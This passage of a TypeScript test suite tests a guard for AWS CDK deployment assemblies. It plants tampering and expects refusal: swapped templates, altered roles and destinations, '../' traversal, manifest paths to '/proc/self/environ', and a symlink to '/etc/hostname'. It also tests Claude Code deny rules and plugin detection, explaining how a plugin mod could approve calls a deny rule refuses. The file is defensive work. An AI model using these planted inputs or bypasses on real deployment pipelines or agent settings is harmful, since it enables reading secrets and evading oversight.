      if (!stealthy && outputs.Release !== undefined) outputs.Release.Value = OTHER
      for (const resource of Object.values(json.Resources as Record<string, Record<string, unknown>>)) {
        if (resource.Type !== 'AWS::ECS::TaskDefinition') continue
        const properties = resource.Properties as { ContainerDefinitions: Array<Record<string, unknown>> }
        for (const container of properties.ContainerDefinitions) {
          if (stealthy)
            container.Environment = [...((container.Environment as unknown[]) ?? []), { Name: 'X', Value: 'x' }]
          else container.Image = 'example.invalid/not-the-release:latest'
        }
      }
      write(join(folder, 'deployed.json'), json)
      return 'deployed.json'
    }
    // The Services template asset's own destination, and an asset added to one stack's asset manifest.
    const servicesDestination = (folder: string) => {
      const [entry] = entries(read(named(folder, 'Services', '.assets.json')))
      const [destination] = Object.values(entry?.destinations ?? {})
      return { ...destination }
    }
    const addAsset = (folder: string, part: string, path: string, destination: Record<string, unknown>) =>
      edit(named(folder, part, '.assets.json'), json => {
        ;(json.files as Record<string, unknown>)['0'.repeat(64)] = {
          displayName: 'an asset of its own',
          source: { path, packaging: 'file' },
          destinations: { 'current_account-ap-southeast-1-00000000': destination },
        }
      })
    const REGION_BUCKET = `cdk-hearthapp-assets-\${AWS::AccountId}-\${AWS::Region}`
    // P and S: the Tasks asset manifest uploads another template to the Services template's bucket and key,
    // the bucket spelled with the region's placeholder, in both stages; and the same spelled as the synth
    // spells it, whose bytes then aren't the key's.
    const onTasks =
      (bucketName: string, stealthy = false) =>
      (dir: string) => {
        for (const folder of [nonprod(dir), prod(dir)])
          addAsset(folder, 'Tasks', deployed(folder, stealthy), { ...servicesDestination(folder), bucketName })
      }
    expect(check(onTasks(REGION_BUCKET))).toBe(DESTINATION)
    expect(check(onTasks(REGION_BUCKET, true))).toBe(DESTINATION)
    expect(check(onTasks(BUCKET))).toBe(KEY)
    expect(check(onTasks(BUCKET, true))).toBe(KEY)
    // Q1 then Q2: an asset uploads another template to a key no stack names; then the Services template URL
    // and its own asset name that key, the asset uploading the honest templateFile.
    const Q = `${'a'.repeat(64)}.json`
    expect(
      check(dir =>
        addAsset(nonprod(dir), 'Services', deployed(nonprod(dir)), {
          ...servicesDestination(nonprod(dir)),
          objectKey: Q,
        }),
      ),
    ).toBe(KEY)
    expect(
      check(dir => {
        edit(named(nonprod(dir), 'Services', '.assets.json'), json => {
          for (const entry of entries(json))
            for (const destination of Object.values(entry.destinations)) destination.objectKey = Q
        })
        edit(join(nonprod(dir), 'manifest.json'), json => {
          for (const artifact of Object.values(artifacts(json)))
            if (artifact.properties?.stackName === 'Hearth-nonprod-Services')
              artifact.properties.stackTemplateAssetObjectUrl = `s3://${BUCKET}/${Q}`
        })
      }),
    ).toBe(KEY)
    // R: the template URL and its asset name a bucket outside the bootstrap.
    expect(
      check(dir => {
        const other = 'another-bucket-example'
        edit(named(nonprod(dir), 'Services', '.assets.json'), json => {
          for (const entry of entries(json))
            for (const destination of Object.values(entry.destinations)) destination.bucketName = other
        })
        edit(join(nonprod(dir), 'manifest.json'), json => {
          for (const artifact of Object.values(artifacts(json)))
            if (artifact.properties?.stackName === 'Hearth-nonprod-Services') {
              const url = String(artifact.properties.stackTemplateAssetObjectUrl)
              artifact.properties.stackTemplateAssetObjectUrl = url.replace(BUCKET, other)
            }
        })
      }),
    ).toBe(DESTINATION)
    // Each destination field off the synth's: another region, another role, a field of its own, a second
    // destination, a key in a folder, upper-case hex, a file at a .zip key, and a file outside its folder.
    const destinations = (change: (entry: Entry) => void) => (dir: string) =>
      edit(named(prod(dir), 'Data', '.assets.json'), json => {
        for (const entry of entries(json)) change(entry)
      })
    const each = (change: (destination: Record<string, unknown>) => void) =>
      destinations(entry => {
        for (const destination of Object.values(entry.destinations)) change(destination)
      })
    for (const plant of [
      each(destination => (destination.region = 'us-east-1')),
      each(
        destination =>
          (destination.assumeRoleArn = String(destination.assumeRoleArn).replace('file-publishing', 'deploy')),
      ),
      each(destination => (destination.assumeRoleExternalId = 'x')),
      each(destination => (destination.objectKey = `x/${String(destination.objectKey)}`)),
      each(
        destination => (destination.objectKey = String(destination.objectKey).toUpperCase().replace('.JSON', '.json')),
      ),
      each(destination => (destination.objectKey = String(destination.objectKey).replace('.json', '.zip'))),
      destinations(entry => {
        const [first] = Object.values(entry.destinations)
        entry.destinations.second = { ...first }
      }),
      destinations(entry => (entry.source.path = `../assembly-prod/${String(entry.source.path)}`)),
    ]) {
      expect(check(plant)).toBe(DESTINATION)
    }
  }, 120_000)

  // Round 5's second attack (COMMANDS-A2-02). The CLI acts on each stack's deploy facts, which no template
  // or diff shows: it sets termination protection to the artifact's (off when it is missing), reads the
  // bootstrap version from the parameter the artifact names with the deploy role and prints its value
  // when it isn't a number, and hands CloudFormation the artifact's notification topics, tags and
  // parameters. So each stack's and asset manifest's are exactly the synth's.
  it('holds each stack’s and asset manifest’s deploy facts to the synth’s (COMMANDS-A2-02)', () => {
    const stacksOf =
      (change: (artifact: Artifact & { environment?: string }) => void, part?: string) => (dir: string) =>
        edit(join(prod(dir), 'manifest.json'), json => {
          for (const artifact of Object.values(artifacts(json)))
            if (
              artifact.type === 'aws:cloudformation:stack' &&
              (part === undefined || String(artifact.properties?.stackName).endsWith(`-${part}`))
            )
              change(artifact)
        })
    const property = (name: string, value: unknown, part?: string) =>
      stacksOf(artifact => {
        if (artifact.properties !== undefined) artifact.properties[name] = value
      }, part)
    for (const [plant, label] of [
      [
        stacksOf(artifact => {
          if (artifact.properties !== undefined) delete artifact.properties.terminationProtection
        }, 'Platform'),
        'Platform unprotected',
      ],
      [property('terminationProtection', false, 'Data'), 'Data unprotected'],
      [property('terminationProtection', true, 'Services'), 'Services protected'],
      [property('bootstrapStackVersionSsmParameter', '/hearth/organisation/id', 'Services'), 'another parameter'],
      [property('requiresBootstrapStackVersion', 1), 'another version'],
      [property('notificationArns', ['x'], 'Services'), 'a topic'],
      [property('tags', { x: 'y' }, 'Services'), 'a tag'],
      [property('parameters', { X: 'y' }), 'a parameter'],
      [property('assumeRoleExternalId', 'x'), 'an external id'],
      [property('validateOnSynth', true), 'validated on synth'],
      [
        stacksOf(artifact => {
          const role = artifact.properties?.lookupRole as Record<string, unknown> | undefined
          if (role !== undefined) role.bootstrapStackVersionSsmParameter = '/hearth/organisation/id'
        }),
        "the lookup role's parameter",
      ],
      [
        stacksOf(artifact => {
          if (artifact.properties !== undefined)
            artifact.properties.assumeRoleArn = String(artifact.properties.assumeRoleArn).replace('deploy', 'lookup')
        }),
        'another deploy role',
      ],
      [
        stacksOf(artifact => {
          artifact.environment = 'aws://unknown-account/us-east-1'
        }),
        'another region',
      ],
      [
        (dir: string) =>
          edit(join(nonprod(dir), 'manifest.json'), json => {
            for (const artifact of Object.values(artifacts(json)))
              if (artifact.type === 'cdk:asset-manifest' && artifact.properties !== undefined)
                artifact.properties.bootstrapStackVersionSsmParameter = '/hearth/organisation/id'
          }),
        "an asset manifest's parameter",
      ],
      [
        (dir: string) =>
          edit(join(nonprod(dir), 'manifest.json'), json => {
            for (const artifact of Object.values(artifacts(json)))
              if (artifact.type === 'cdk:asset-manifest' && artifact.properties !== undefined)
                artifact.properties.assumeRoleExternalId = 'x'
          }),
        "an asset manifest's property of its own",
      ],
    ] as const) {
      expect(check(plant), label).toBe(FACTS)
    }
  }, 120_000)

  it('refuses each planted breakage of the manifests, the files they name and the tree', () => {
    const inManifest =
      (folder: (dir: string) => string, change: (json: Record<string, unknown>) => void) => (dir: string) =>
        edit(join(folder(dir), 'manifest.json'), change)
    const each = (type: string, change: (artifact: Artifact) => void) => (json: Record<string, unknown>) => {
      for (const artifact of Object.values(artifacts(json))) if (artifact.type === type) change(artifact)
    }
    expect(
      check(
        inManifest(
          nonprod,
          each('cdk:asset-manifest', artifact => ((artifact.properties ?? {}).file = '../x.assets.json')),
        ),
      ),
    ).toBe(PLAIN)
    expect(
      check(
        inManifest(
          nonprod,
          each('aws:cloudformation:stack', artifact => ((artifact.properties ?? {}).templateFile = '../t.json')),
        ),
      ),
    ).toBe(PLAIN)
    expect(
      check(
        inManifest(
          d => d,
          each('cdk:cloud-assembly', artifact => ((artifact.properties ?? {}).directoryName = 'a/b')),
        ),
      ),
    ).toBe(PLAIN)
    expect(
      check(
        inManifest(
          d => d,
          each('cdk:tree', artifact => ((artifact.properties ?? {}).file = '/proc/self/environ')),
        ),
      ),
    ).toBe(PLAIN)
    expect(
      check(inManifest(prod, json => (json.missing = [{ key: 'x', provider: 'availability-zones', props: {} }]))),
    ).toBe(refused('a manifest has missing context, which the CLI would look up'))
    expect(
      check(
        inManifest(
          d => d,
          json => (artifacts(json).p = { type: 'cdk:plugin' }),
        ),
      ),
    ).toBe(refused('an artifact type is not one a workload synth writes'))
    expect(check(dir => symlinkSync('/etc/hostname', join(prod(dir), 'link')))).toBe(
      refused('the assembly holds a symbolic link'),
    )
  }, 30_000)

  it('refuses a legacy asset entry anywhere the CLI reads metadata, and a metadata file it can’t read', () => {
    expect(
      check(dir =>
        edit(named(nonprod(dir), 'Services', '.metadata.json'), json => (json['/nonprod/Services'] = [ENTRY])),
      ),
    ).toBe(LEGACY)
    expect(
      check(dir =>
        edit(join(dir, 'manifest.json'), json => {
          const artifact = artifacts(json)['assembly-nonprod']
          if (artifact !== undefined) artifact.metadata = { '/': [ENTRY] }
        }),
      ),
    ).toBe(LEGACY)
    expect(
      check(dir =>
        edit(join(dir, 'manifest.json'), json => {
          for (const artifact of Object.values(artifacts(json)))
            if (artifact.type === 'cdk:tree') artifact.additionalMetadataFile = '/proc/self/environ'
        }),
      ),
    ).toBe(PLAIN)
    expect(check(dir => rmSync(named(nonprod(dir), 'Data', '.metadata.json')))).toBe(
      refused('a metadata file is missing'),
    )
    expect(check(dir => writeFileSync(named(nonprod(dir), 'Data', '.metadata.json'), '[]'))).toBe(
      refused('a metadata file is not a JSON object of entry lists'),
    )
  }, 30_000)

  it('refuses an assembly built for another release', () => {
    const other = `${'e'.repeat(40)}:sha256:${'0'.repeat(64)}`
    expect(
      check(dir => {
        edit(named(prod(dir), 'Services', '.template.json'), json => {
          const outputs = json.Outputs as Record<string, { Value: unknown }>
          if (outputs.Release !== undefined) outputs.Release.Value = other
        })
        rekey(prod(dir), 'Services')
      }),
    ).toBe(refused("a Services template's Release is not this job's release"))
    expect(
      check(dir => {
        const template = named(prod(dir), 'Tasks', '.template.json')
        writeFileSync(
          template,
          readFileSync(template, 'utf8').replaceAll(
            `hearth-server@sha256:${'0'.repeat(64)}`,
            `hearth-server@sha256:${'1'.repeat(64)}`,
          ),
        )
        rekey(prod(dir), 'Tasks')
      }),
    ).toBe(refused('a container image is not the server image at this release'))
    expect(check(() => {}, other)).toBe(refused("a Services template's Release is not this job's release"))
    expect(check(() => {}, 'x')).toBe(refused('the release is not <commit>:<digest>'))
  }, 30_000)

  it('holds the probe’s and migrate’s line patterns to what they print', () => {
    const probe = new RegExp(PROBE_LINES)
    for (const line of ['api 0 200 -', 'realtime 1 no-answer ?', 'worker 0 503 valkey,database', 'probe: failed'])
      expect(probe.test(line), line).toBe(true)
    for (const line of [`api 0 200 ${[10, 0, 0, 1].join('.')}`, 'api 0 200', 'probe: failed at x'])
      expect(probe.test(line), line).toBe(false)
    const migrate = new RegExp(MIGRATE_LINES)
    for (const line of [
      'migrate: applied 0015_x',
      'migrate: nothing to apply',
      'migrate: nothing was applied; the batch rolled back',
    ]) {
      expect(migrate.test(line), line).toBe(true)
    }
    expect(migrate.test('migrate: failed 0015_x: password authentication failed')).toBe(false)
  })
})

// The deny rules (C11-D77; T24 item 21; review RULES-01). Claude Code reads a `:*` as a prefix wildcard only
// at a Bash rule's end; anywhere else its colon is a literal character, so `Bash(gh api:*dispatches*)`
// would match no real command and refuse nothing. A rule with text after a wildcard is written with a
// space, `Bash(gh api *dispatches*)`. This reads the committed settings and refuses a `:*` elsewhere.
describe('C11-D77: the deny rules in .claude/settings.json', () => {
  const midRule = (deny: readonly string[]) =>
    deny.filter(rule => /^Bash\(.*\)$/s.test(rule) && rule.slice(5, -1).replace(/:\*$/, '').includes(':*'))

  it('finds a :* anywhere but at a Bash rule’s end', () => {
    expect(
      midRule([
        'Bash(gh api:*pending_deployments*)',
        'Bash(gh run rerun:*)',
        'Bash(gh api *dispatches*)',
        'Bash(*scripts/x.sh apply*)',
        'Bash(a:*b:*)',
        'mcp__github__actions_run_trigger',
      ]),
    ).toEqual(['Bash(gh api:*pending_deployments*)', 'Bash(a:*b:*)'])
  })

  it('holds the repository', () => {
    const settings = JSON.parse(readRepoFile('.claude/settings.json')) as { permissions?: { deny?: unknown } }
    const deny = settings.permissions?.deny
    expect(Array.isArray(deny) && deny.length > 0 && deny.every(rule => typeof rule === 'string')).toBe(true)
    expect(midRule(deny as string[])).toEqual([])
  })
})

// The repository carries no plugin (C11-D77; T24 item 21; the owner's answer of 12 Nov 2026 and review 4
// RULES-02). A folder under .claude/skills/ holding a .claude-plugin/plugin.json loads as <name>@skills-dir,
// its hooks and any mod included, for every collaborator who trusts the folder, and a mod that handles
// tool.check can approve a call a deny rule refuses; a settings file there that enables a plugin or names
// a marketplace brings one in from outside. So no file under .claude/ is a plugin's manifest (any
// .claude-plugin/ folder) or a plugin's hooks file (hooks/hooks.json), and no settings file there, the
// local one included should it be committed, holds enabledPlugins or extraKnownMarketplaces.
describe('C11-D77: the repository carries and enables no plugin', () => {
  const pluginFindings = (texts: ReadonlyArray<readonly [string, string]>) =>
    texts.flatMap(([path, text]) => {
      if (!path.startsWith('.claude/')) return []
      if (/(?:^|\/)\.claude-plugin(?:\/|$)/.test(path)) return [`${path}: a plugin's manifest`]
      if (/(?:^|\/)hooks\/hooks\.json$/.test(path)) return [`${path}: a plugin's hooks file`]
      if (!/^\.claude\/settings(?:\.local)?\.json$/.test(path)) return []
      let settings: unknown
      try {
        settings = JSON.parse(text)
      } catch {
        return [`${path}: isn't JSON`]
      }
      if (typeof settings !== 'object' || settings === null || Array.isArray(settings))
        return [`${path}: isn't an object`]
      return ['enabledPlugins', 'extraKnownMarketplaces']
        .filter(key => Object.hasOwn(settings, key))
        .map(key => `${path}: names ${key}`)
    })

  it('finds a plugin manifest, a plugin hooks file and a plugin or marketplace in settings, on planted files', () => {
    const settings = JSON.parse(readRepoFile('.claude/settings.json')) as Record<string, unknown>
    expect(
      pluginFindings([
        ['.claude/skills/tidy/.claude-plugin/plugin.json', '{"name":"tidy"}'],
        ['.claude/skills/tidy/hooks/hooks.json', '{}'],
        ['.claude/skills/tidy/SKILL.md', 'A skill.'],
        ['.claude/hooks/auto-push.sh', '#!/bin/sh'],
        [
          '.claude/settings.json',
          JSON.stringify({ ...settings, enabledPlugins: { 'tidy@market': true }, extraKnownMarketplaces: {} }),
        ],
        ['.claude/settings.local.json', JSON.stringify({ enabledPlugins: {} })],
        ['.claude/settings.json', '{'],
        ['docs/.claude-plugin/plugin.json', '{}'],
      ]),
    ).toEqual([
      ".claude/skills/tidy/.claude-plugin/plugin.json: a plugin's manifest",
      ".claude/skills/tidy/hooks/hooks.json: a plugin's hooks file",
      '.claude/settings.json: names enabledPlugins',
      '.claude/settings.json: names extraKnownMarketplaces',
      '.claude/settings.local.json: names enabledPlugins',
      ".claude/settings.json: isn't JSON",
    ])
  })

  it('holds the repository', () => {
    const claude = files.filter(path => path.startsWith('.claude/'))
    expect(claude).toContain('.claude/settings.json')
    expect(pluginFindings(claude.map(path => [path, readRepoFile(path)] as const))).toEqual([])
  })
})
